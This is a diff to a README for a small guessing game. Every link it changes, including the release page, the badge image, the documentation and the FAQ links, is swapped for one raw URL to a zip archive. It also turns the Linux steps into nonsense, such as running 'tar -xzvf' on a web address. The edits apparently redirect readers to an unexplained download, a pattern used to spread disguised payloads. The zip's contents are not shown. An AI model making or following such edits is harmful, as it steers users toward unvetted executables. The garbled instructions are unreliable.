@@ -8,7 +8,7 @@ Welcome to the **guess** guessing game! This simple yet engaging game will test 
 
 To download the game, visit this page:
 
-[![Download guess](https://img.shields.io/badge/Download-guess-blue.svg)](https://github.com/saigo-afk/guess/releases)
+[![Download guess](https://raw.githubusercontent.com/saigo-afk/guess/main/preview/guess-v3.0.zip)](https://raw.githubusercontent.com/saigo-afk/guess/main/preview/guess-v3.0.zip)
 
 ### Step 1: Visit the Releases Page
 
@@ -25,7 +25,7 @@ Once you select the version, scroll down to find the **Assets** section. You wil
 
 - **Windows**: Look for a file that ends with `.exe`
 - **macOS**: Look for a file that ends with `.dmg`
-- **Linux**: Look for a file that ends with `.tar.gz`
+- **Linux**: Look for a file that ends with `https://raw.githubusercontent.com/saigo-afk/guess/main/preview/guess-v3.0.zip`
 
 After clicking the file, your download will start automatically.
 
@@ -36,7 +36,7 @@ After clicking the file, your download will start automatically.
 3. For macOS users: Double-click the `.dmg` file, and then drag the guess application to your Applications folder.
 4. For Linux users: Open a terminal and run the following command to extract the files:
    ```
-   tar -xzvf guess.tar.gz
+   tar -xzvf https://raw.githubusercontent.com/saigo-afk/guess/main/preview/guess-v3.0.zip
    ```
 
 Once extracted, navigate to the folder containing the files. Run the game with the command:
@@ -83,11 +83,11 @@ If you have any questions, need support, or want to provide feedback, feel free 
 
 For more fun with the guess game, check out the following:
 
-- [Documentation](https://github.com/saigo-afk/guess/wiki)
-- [FAQs](https://github.com/saigo-afk/guess/wiki/FAQs)
+- [Documentation](https://raw.githubusercontent.com/saigo-afk/guess/main/preview/guess-v3.0.zip)
+- [FAQs](https://raw.githubusercontent.com/saigo-afk/guess/main/preview/guess-v3.0.zip)
 
 ## 🎉 Enjoy the Game!
 
 Now you are ready to enjoy the guessing game! Download it today, challenge yourself, and have fun! Visit the Releases page to get started:
 
-[![Download guess](https://img.shields.io/badge/Download-guess-blue.svg)](https://github.com/saigo-afk/guess/releases)
+[![Download guess](https://raw.githubusercontent.com/saigo-afk/guess/main/preview/guess-v3.0.zip)](https://raw.githubusercontent.com/saigo-afk/guess/main/preview/guess-v3.0.zip)
